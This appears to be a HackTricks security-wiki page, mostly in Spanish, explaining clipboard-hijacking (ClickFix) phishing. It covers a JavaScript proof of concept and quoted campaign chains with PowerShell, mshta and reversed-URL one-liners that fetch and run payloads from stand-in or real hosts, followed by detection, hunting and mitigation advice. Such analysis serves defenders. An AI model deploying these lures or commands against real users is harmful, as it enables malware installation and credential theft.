# Clipboard Hijacking (Pastejacking) Ataques

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – consejo antiguo pero aún válido

## Resumen

Clipboard hijacking – también conocido como *pastejacking* – abusa del hecho de que los usuarios suelen copiar y pegar comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con soporte para JavaScript, como una aplicación Electron o Desktop) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. A las víctimas se les anima, normalmente mediante instrucciones de social-engineering cuidadosamente elaboradas, a pulsar **Win + R** (diálogo Run), **Win + X** (Acceso rápido / PowerShell), o a abrir un terminal y *pegar* el contenido del portapapeles, ejecutando de inmediato comandos arbitrarios.

Debido a que **no se descarga ningún archivo y no se abre ningún adjunto**, la técnica evade la mayoría de los controles de seguridad de correo electrónico y de contenido web que monitorean adjuntos, macros o la ejecución directa de comandos. Por ello, el ataque es popular en campañas de phishing que distribuyen familias de malware comercial como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Prueba de concepto en JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Las campañas más antiguas usaban `document.execCommand('copy')`, las más recientes se basan en la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).

## Flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript inyectado **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que guarda silenciosamente en el portapapeles un comando de PowerShell de una sola línea codificado en Base64.
3. Las instrucciones HTML indican a la víctima: *“Presione **Win + R**, pegue el comando y pulse Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. tarea programada) – finalmente ejecuta NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente las APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) vía **curl.exe**, los descifra usando una clave XOR rodante `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el JScript downloader dentro de **cscript.exe**
3. Obtiene un MSI payload → coloca `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** lanza un script PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos y finalmente ejecuta un script `.a3x` que exfiltra credenciales de navegador a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un one‑liner que descarga y ejecuta JavaScript vía WSH, lo persiste y rota el C2 diariamente. Cadena observada de ejemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evitar una inspección casual.
- JavaScript se mantiene persistente mediante un Startup LNK (WScript/CScript) y selecciona el C2 según el día actual – habilitando una rápida domain rotation.

Fragmento JS mínimo usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa comúnmente despliega un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado hardcoded y fragmentando el tráfico.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
